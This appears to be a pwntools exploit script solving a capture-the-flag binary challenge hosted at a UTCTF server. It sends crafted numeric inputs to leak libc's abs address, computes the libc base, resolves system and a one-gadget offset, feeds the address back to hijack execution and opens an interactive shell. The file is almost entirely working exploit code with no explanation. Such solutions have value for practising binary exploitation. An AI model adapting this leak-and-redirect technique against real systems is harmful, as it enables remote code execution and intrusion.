#!/usr/bin/env python
from pwn import *
# context.terminal = ["tmux", "splitw", "-h"]
#p = process("/media/sf_UBUNTU-18/PWNING/bamboofox/babystackbabystack")
binf = ELF("./functionalprogramming")
libc=ELF("./libc6_2.23-0ubuntu11.2_amd64.so")

#libc = ELF("libc-2.29.so")
p = remote("pwn.utctf.live", 5432)
#p=process('functionalprogramming')

gs = '''
break *0x555555554cfd
'''

def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return remote("pwn.utctf.live",5432)


#context.log_level = "DEBUG"


p=start()
#pause()
print("********")

p.sendline("2")
p.sendline("1852400175")
p.sendline("6845231")
#pause()
p.recvuntil('Abs: ')
leak=(p.recv())[:-1]
print("leak")
print(leak)
print("puts")
abss=libc.symbols['abs']
print(hex(abss))
print("base")
libc.address=int(leak,16)-abss
print(hex(libc.address))
print(hex(libc.symbols['abs']))
system=hex(libc.symbols['system'])
print("system",str(system))
#print(hex(base))
p.sendline("AAAAAAAA")
one=libc.address+0xf1207
print("one ",hex(one))
p.sendline(str(system))
#p.sendline("CCCCCCCC")
p.interactive()
